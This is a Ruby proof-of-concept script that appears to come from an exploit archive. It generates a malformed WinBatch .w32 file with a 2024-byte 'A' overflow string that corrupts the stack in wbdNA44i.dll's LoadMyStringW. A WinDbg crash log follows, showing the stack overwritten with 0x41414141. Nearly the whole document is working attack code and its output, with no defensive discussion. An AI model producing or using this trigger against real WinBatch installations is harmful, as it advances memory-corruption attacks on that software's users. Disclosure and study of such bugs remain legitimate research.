#!/usr/bin/env ruby
# winbatch 2014-2017 stack corruption in wbdNA44i.dll!LoadMyStringW 
require 'rex'

t = "\x9f" + "A" * 2024

buf =  "dllname=strcat(dirwindows(1),\"Advapi32.dll\")\r\n"
buf << "#{t}=\"OpenEventLogB\""

fd = File.new("stackcorrupt.w32","wb")
fd.write(buf)
fd.close
__END__
(190c.b90): Access violation - code c0000005 (!!! second chance !!!)
eax=00828f71 ebx=00000000 ecx=7584ffff edx=00041041 esi=0061f2b4 edi=0061ea84
eip=1c022317 esp=0061e8d0 ebp=0079c550 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
WBDNA44I!LoadMyStringW+0x11a7:
1c022317 3210            xor     dl,byte ptr [eax]          ds:002b:00828f71=??
0:000> kv
 # ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0061e8f4 1c021cc3 0079c550 0061ea84 00000801 WBDNA44I!LoadMyStringW+0x11a7
01 0061ea84 41414141 41414141 41414141 41414141 WBDNA44I!LoadMyStringW+0xb53
02 0061ea88 41414141 41414141 41414141 41414141 0x41414141
03 0061ea8c 41414141 41414141 41414141 41414141 0x41414141
04 0061ea90 41414141 41414141 41414141 41414141 0x41414141
05 0061ea94 41414141 41414141 41414141 41414141 0x41414141
06 0061ea98 41414141 41414141 41414141 41414141 0x41414141

